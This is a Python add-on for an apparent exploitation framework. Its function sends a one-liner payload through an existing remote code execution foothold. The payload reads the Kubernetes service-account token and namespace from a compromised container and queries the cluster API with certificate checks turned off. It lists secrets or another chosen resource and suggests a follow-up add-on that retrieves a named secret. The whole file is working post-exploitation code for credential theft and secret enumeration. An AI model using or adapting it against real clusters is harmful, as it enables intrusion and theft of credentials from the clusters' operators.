import json

def run(exploit, params=None):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    target_res = params[0] if params and len(params) > 0 else "secrets"
    print(f"\n{B}[ K8S EXPLORER: LIST {C}{target_res.upper()}{B} ]{N}")

    # The payload strictly reads the token and namespace from the container's volume
    payload = (
        f"(lambda ns, token: (lambda conn: (conn.request('GET', f'/api/v1/namespaces/{{ns}}/{target_res}', "
        f"headers={{'Authorization': 'Bearer ' + token}}), "
        f"conn.getresponse().read().decode())[1])"
        f"(__import__('http.client').client.HTTPSConnection('kubernetes.default', context=__import__('ssl')._create_unverified_context())))"
        f"(open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip(), "
        f"open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip())"
    )

    result = exploit.execute(payload)
    try:
        data = json.loads(result)
        items = data.get('items', [])
        print(f"FOUND {len(items)} {target_res.upper()}(S):")
        for item in items:
            print(f" {G}●{N} {item['metadata']['name']}")
        if items:
            print(f"\n {Y}Try: --addon k8s_get {target_res} {items[0]['metadata']['name']}{N}")
    except Exception:
        print(f" {R}!!{N} List failed. API Response: {result[:200]}")
    print(f"\n{B}[ Operation Complete ]{N}\n")